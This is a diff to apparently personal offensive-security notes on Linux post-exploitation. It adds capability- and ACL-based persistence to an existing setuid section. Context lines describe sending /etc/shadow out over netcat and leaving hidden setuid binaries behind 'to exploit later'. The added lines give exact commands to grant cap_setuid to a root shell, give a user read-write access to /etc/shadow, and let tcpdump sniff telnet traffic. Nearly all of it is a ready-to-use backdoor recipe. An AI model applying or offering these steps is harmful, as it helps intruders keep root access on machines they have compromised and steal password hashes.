@@ -52,9 +52,11 @@ int main()
 **Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
 SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />
 
-## >> Persistence with setuid
+## >> Persistence with setuid, capabilities and ACLs
 
-Once you have root on a system leave these behind to exploit later:<br >
+Once you have root on a system leave these behind to exploit later:
+
+**(setuid)**<br />
 * `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
 * `chmod u+s /usr/bin/cat` will allow you to view `/etc/shadow` as an ordinary user.
 * Or discreetly `cp /bin/cat /bin/.cat` then `chmod u+s /bin/.cat` then as user `.cat /etc/shadow`
@@ -78,6 +80,23 @@ int main(int argc, char **argv)
 ```
 setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
 Now execute `.setuid-shell` and see that you are root by issuing the `id` command.
+
+**(capabilities)**<br />
+* Compile the C program above as an ordinary user.<br />
+* As root, `setcap cap_setuid=eip /home/myuser/setuid-shell`<br />
+* As the user, execute `setuid-shell` then `id` to see that you are root.<br />
+Allow non-root user to execute `tcpdump` so insecure protocols can be captured.<br>
+* As root, `setcap cap_net_raw=eip /usr/sbin/tcpdump`<br />
+* As the user, execute `tcpdump -nn -vv -X -i eth0 port 23`<br />
+Example of removing capabilities `setcap -r /usr/sbin/tcpdump`<br />
+Example of listing capabilities `getcap /usr/sbin/tcpdump`
+
+**(ACLs)**<br />
+* As root, `setfacl -m u:myuser:rw /etc/shadow`<br />
+* Execute `getfacl /etc/shadow` will show `user:myuser:rw-` and `ls -l /etc/shadow` will show `-rw-rw----+`<br />
+* As the user, execute `cat /etc/shadow` to see the contents of the file.<br />
+* To remove a specific ACL, execute `setfacl -x u:myuser /etc/shadow`<br />
+* To remove all ACLs, execute `setfacl -b /etc/shadow`
 
 ## >> Changing the process name in ps
 
